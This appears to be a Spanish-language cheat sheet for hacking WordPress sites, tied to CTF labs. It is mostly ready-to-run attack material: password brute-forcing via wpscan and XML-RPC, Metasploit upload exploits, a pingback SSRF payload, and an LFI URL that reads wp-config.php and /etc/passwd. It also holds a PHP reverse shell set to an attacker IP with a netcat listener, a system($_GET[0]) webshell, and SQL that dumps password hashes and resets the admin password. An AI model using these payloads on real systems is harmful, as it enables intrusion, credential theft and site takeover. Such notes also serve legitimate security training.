# WORDPRESS HACKING

## Table of contents

- [WORDPRESS HACKING](#wordpress-hacking)
  - [WPSCAN](#wpscan)
  - [METASPLOIT PAYLOADS](#metasploit-payloads)
  - [WordPress Structure](#wordpress-structure)
    - [FILE STRUCTURE](#file-structure)
    - [Directorios clave de WordPress](#directorios-clave-de-wordpress)
  - [ROLES DE USUARIO EN WORDPRESS](#roles-de-usuario-en-wordpress)
  - [PLUGIN ENUMERATION](#plugin-enumeration)
  - [THEMES ENUMERATION](#themes-enumeration)
  - [ENUMERACION DE DIRECTORY INDEXING](#enumeracion-de-directory-indexing)
  - [INFORMACION BASICA](#informacion-basica)
  - [ENUMERACION SIN WPSCAN](#enumeracion-sin-wpscan)
    - [enumeracion de plugins](#enumeracion-de-plugins)
    - [enumeracion de temas](#enumeracion-de-temas)
    - [enumeracion de usuarios](#enumeracion-de-usuarios)
  - [XML-RPC](#xml-rpc)
  - [LFI WORDPRESS](#lfi-wordpress)
  - [PANEL RCE](#panel-rce)
  - [PLUGIN RCE](#plugin-rce)
  - [POST EXPLOTACION](#post-explotacion)

## WPSCAN

WPScan puede extraer información de vulnerabilidades de fuentes externas para mejorar nuestros escaneos. Podemos obtener un token API de [WPVulnDB](https://wpvulndb.com/) , que WPScan utiliza para buscar vulnerabilidades y explotar pruebas de concepto (POC) e informes. El plan gratuito permite hasta 50 solicitudes por día. Para usar la base de datos WPVulnDB, simplemente cree una cuenta y copie el token API de la página de usuarios. Este token se puede suministrar a WPScan usando el parámetro `--api-token`.

```bash
wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
```

escaneo basico:

```bash
wpscan --url http://192.168.1.105/wordpress/
```

enumeracion de temas:

```bash
wpscan --url http://192.168.1.105/wordpresws/ -e at
```

enumeracion de plugins:

```bash
wpscan --url http://192.168.1.105/wordpress/ -e ap
```

enumeracion de usuarios:

```bash
wpscan –url http://192.168.1.105/wordpress/ -e u

wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
```

enumeracion de todo:

```bash
wpscan --url http://192.168.1.105/wordpress/ -e at –e ap –e u
```

Ataque de fuerza bruta:

Tener un archivo de posibles usuarios (**users.txt**).

```bash
wpscan --url http://192.168.1.105/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```

Escaneo bajo un proxy:

```bash
wpscan --url http://192.168.1.105/wordpress/ --proxy http://127.0.0.1:8080
```

## METASPLOIT PAYLOADS

```
use exploit/unix/webapp/wp_admin_shell_upload
use auxiliary/scanner/http/wordpress_login_enum
use exploit/unix/webapp/wp_nmediawebsite_file_upload

# plugins
use exploit/unix/webapp/wp_slideshowgallery_upload
use exploit/unix/webapp/wp_wysija_newsletters_upload
```

## WordPress Structure

### FILE STRUCTURE

```bash
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

- `index.php`: es la página de inicio de WordPress. 
- `license.txt`: contiene información útil como la versión de WordPress instalada.
- `wp-activate.php`: se utiliza para el proceso de activación de correo electrónico al configurar un nuevo sitio de WordPress.
- `wp-admin`: La carpeta contiene la página de inicio de sesión para el acceso del administrador y el panel de backend. Una vez que un usuario ha iniciado sesión, puede realizar cambios en el sitio según los permisos asignados. La página de inicio de sesión se puede ubicar en una de las siguientes rutas:

	- `/wp-admin/login.php`
	- `/wp-admin/wp-login.php`
	- `/login.php`
	- `/wp-login.php`

También se puede cambiar el nombre de este archivo para que sea más difícil encontrar la página de inicio de sesión.

- `xmlrpc.php`: es un archivo que representa una función de WordPress que permite que los datos se transmitan con HTTP actuando como mecanismo de transporte y XML como mecanismo de codificación. Este tipo de comunicación ha sido reemplazada por la [API REST](https://developer.wordpress.org/rest-api/reference) de WordPress.
- `wp-config.php`:  contiene la información requerida por WordPress para conectarse a la base de datos, como el nombre de la base de datos, el host de la base de datos, el nombre de usuario y la contraseña, las claves de autenticación y las sales, y el prefijo de la tabla de la base de datos.

```php
<?php
/** <SNIP> */
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** MySQL database username */
define( 'DB_USER', 'username_here' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password_here' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Authentication Unique Keys and Salts */
/* <SNIP> */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/** WordPress Database Table prefix */
$table_prefix = 'wp_';

/** For developers: WordPress debugging mode. */
/** <SNIP> */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

### Directorios clave de WordPress

- La carpeta `wp-content` es el directorio principal donde se almacenan los complementos y los temas. El subdirectorio `uploads/` suele ser donde se almacenan los archivos cargados en la plataforma. Estos directorios y archivos deben enumerarse cuidadosamente, ya que pueden contener datos confidenciales que podrían conducir a la ejecución remota de código o la explotación de otras vulnerabilidades o configuraciones incorrectas.

```bash
tree -L 1 /var/www/html/wp-content
.
├── index.php
├── plugins
└── themes
```

- `wp-includes` contiene todo excepto los componentes administrativos y los temas que pertenecen al sitio web. Este es el directorio donde se almacenan los archivos principales, como certificados, fuentes,  archivos JavaScript y widgets.

```bash
tree -L 1 /var/www/html/wp-includes
.
├── <SNIP>
├── theme.php
├── update.php
├── user.php
├── vars.php
├── version.php
├── widgets
├── widgets.php
├── wlwmanifest.xml
├── wp-db.php
└── wp-diff.php
```

## ROLES DE USUARIO EN WORDPRESS

|Role|Descripción|
|:-------:|:-----:|
|AdministraTor|Este usuario tiene acceso a funciones administrativas dentro del sitio web. Esto incluye agregar y eliminar usuarios y publicaciones, así como editar el código fuente.|
|Editor|Un editor puede publicar y administrar publicaciones, incluidas las publicaciones de otros usuarios.|
|Author|Los autores pueden publicar y administrar sus propias publicaciones.|
|Contributor|Estos usuarios pueden escribir y administrar sus propias publicaciones, pero no pueden publicarlas.|
|Subscriber|Estos son usuarios normales que pueden buscar publicaciones y editar sus perfiles.|

## PLUGIN ENUMERATION

```bash
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

## THEMES ENUMERATION

```bash
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```

## ENUMERACION DE DIRECTORY INDEXING

si por ejemplo vamos a una carpeta conocida de la estructura de wordpress como `/wp-includes/` y vemos muchos directorios:

![[Pasted image 20230130155707.png]]

para no tener que estar revisando cada subcarpeta y ver su contenido, podemos descargar todo con **wget** y lueo usar **tree** para el mostrado:

```baswget --no-parent -r http://138.68.188.240:32380/wp-includes/
```

![[Pasted image 20230130155939.png]]

podriamos encontrar archivos interesantes:

![[Pasted image 20230130160020.png]]

## INFORMACION BASICA

- Los archivos cargados van en la ruta: http://10.10.10.10/wp-content/uploads/2018/08/a.txt
- Los archivos de temas se pueden encontrar en **/wp-content/themes/** por lo que si cambia algún php del tema y obtenga RCE, probablemente usará esa ruta. Por ejemplo: El uso del tema **twentytwelve** se puede acceder al archivo 404.php en: **/wp-content/themes/twentytwelve/404.php**.
- Otra url útil podría ser: **/wp-content/themes/default/404.php**.
- En `/wp-content/wp-config.php` puede encontrar la contraseña de root de la base de datos.
- Rutas de acceso predeterminadas para comprobar: **/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**.

Archivos principales:

-   `index.php`
-   `license.txt` contiene información útil como la versión de WordPress instalada.
-   `wp-activate.php` se utiliza para el proceso de activación por correo electrónico al configurar un nuevo sitio de WordPress.
-   Carpetas de inicio de sesión (se puede cambiar el nombre para ocultarlas):
    -   `/wp-admin/login.php`
    -   `/wp-admin/wp-login.php`
    -   `/login.php`
    -   `/wp-login.php`
-   `xmlrpc.php` es un archivo que representa una característica de WordPress que permite que los datos se transmitan con HTTP actuando como mecanismo de transporte y XML como mecanismo de codificación. 
-   La carpeta `wp-content` es el directorio principal donde se almacenan los complementos y temas.
-   `wp-content/uploads/` Es el directorio donde se almacenan los archivos cargados en la plataforma.
-   `wp-includes/` Este es el directorio donde se almacenan los archivos principales, como certificados, fuentes, archivos JavaScript y widgets.

Obtener la version de wordpress:

- wappalyzer.
- whatweb
- /license.txt
- codigo fuente de la pagina. (En el meta generator, css o js)

## ENUMERACION SIN WPSCAN

### enumeracion de plugins

```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

### enumeracion de temas

```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

### enumeracion de usuarios

```bash
curl -s -I -X GET http://blog.example.com/?author=1
```

Se juega con el valor del author. Un codigo de estado 200 o 30X es un usuario valido. Un 400 es invalido.

Tambien se puede en la siguiente ruta:

```
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
```

## XML-RPC

Si está activo, puede realizar una fuerza bruta de credenciales o usarla para lanzar ataques DoS a otros recursos.

Para ver si está activo, intente acceder a **/xmlrpc.php** y envíe esta solicitud:

si esta activo, desde el navegador le indicara que solo acepta peticiones POST, debemos interceptar con burpsuite y poder cambiar el metodo, si vemos que nos responde con un "faultcode 32700" no es nada malo, mas bien es debajo de todo el raw de la peticion donde podemos jugar.

Mandamos la peticion al repeater y debajo de todopodemos colocar lo siguiente.

```xml
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

Ataque de fuerza bruta: (lo mandamos al intruder)

```xml
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```

DDoS o escaneo de puertos (SSRF):

Si puede encontrar el método **pingback.ping** dentro de la lista, puede hacer que Wordpress envíe una solicitud arbitraria a cualquier host / puerto. Si obtiene **faultCode** con un valor mayor a 0, significa que el puerto está abierto.

```xml
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```

carga de archivos:

con las credenciales correctas se puede hacer lo siguiente

```xml
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
	<methodName>wp.uploadFile</methodName>
	<params>
		<param><value><string>1</string></value></param>
		<param><value><string>username</string></value></param>
		<param><value><string>password</string></value></param>
		<param>
			<value>
				<struct>
					<member>
						<name>name</name>
						<value><string>filename.jpg</string></value>
					</member>
					<member>
						<name>type</name>
						<value><string>mime/type</string></value>
					</member>
					<member>
						<name>bits</name>
						<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
					</member>
				</struct>
			</value>
		</param>
	</params>
</methodCall>
```

PRACTICAR
- [https://tryhackme.com/room/colddboxeasy](https://tryhackme.com/room/colddboxeasy)

## LFI WORDPRESS

si encontramos un LFI en algun plugin, podemos leer el archivo `wp-config.php` en el que hay contraseñas de DB, SSH , FTP o Wordpress.

puede estar en:

- directorio raiz (/wordpress o despues de la IP)
- en /wp-content

```bash
http://allinone.thm/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```

## PANEL RCE

Es posible ganar acceso al sistema sin la ayuda de metasploit, aprovechandonos de la plantilla 404 de wordpress.

Dentro del dashboard de Wordpress nos vamos a appearance > themes editor:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/1.PNG)

Y buscamos la plantilla 404 en files themes y podemos colocar el codigo en php que queremos que se nos interprete cuando busq	uemos una ruta que nos exista y nos salga esa plantilla:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/2.PNG)

En caso de algun mensaje de error puedes probar con la misma plantilla 404 pero de otro tema:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/3.PNG)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/4.PNG)

En este caso voy a usar otro porque nos salio el mensaje de error, usare el twenty nineteen y ahi no sale un mensaje de error:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/5.PNG)

Entonces si vamos a la siguiente ruta nos mostrara nuestro comando que colocamos:
wp-contet
```
spectra.htb/main/wp-content/themes/<nuestro tema editado>/404.php
```

En nuestro caso el tema es twenty nineteen:

```
spectra.htb/main/wp-content/themes/twentynineteen/404.php
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/6.PNG)

vemos que esta ejecutando comandos a nivel de sistema, entonces podemos intentar spawnearnos una shell:

colocamos lo siguiente en la plantilla que es una plantilla de monkey pentester:

[monkey pentester](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

a la plantilla solo se cambia los siguiente:

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.41';  // NUESTRA IP
$port = 443;       // PUERTO A LA ESCUCHA
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

y nos colocamos a la escucha con netcat:

```
nc -lvnp 443
```

y obtenemos una conexion reversa:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SPECTRA/images/7.PNG)

PRACTICAR
- [https://tryhackme.com/room/colddboxeasy](https://tryhackme.com/room/colddboxeasy)
- SPECTRA HTB

o podemos agregar la siguienet linea sin eliminar nada:

```php
system($_GET[0]);
```

y lo invocamos

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

## PLUGIN RCE

Si podemos cargar un plugin en el apartado de Plugins > Upload plugin. Podemos cargar el siguiente archivo [ZIP](https://www.exploit-db.com/exploits/36374). (Plugin vulnerable)

Le damos en activaet plugin y usamos el siguiente payload de matasploit

```bash
use exploit/unix/webapp/wp_slideshowgallery_upload
```

### MAIL MASTA 

- unauthenticate SQLi
- LFI

```bash
curl http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

## POST EXPLOTACION

Una vez ya dentro del servidor, si podemos obtener las credenciales de la base de datos del archivo **/wordpress/wp-config.php** podemos realizar los siguientes cambios:

**extraer usuarios y contraseñas**

```sql
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```

**cambiar contraseña de administrador**

````sql
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
``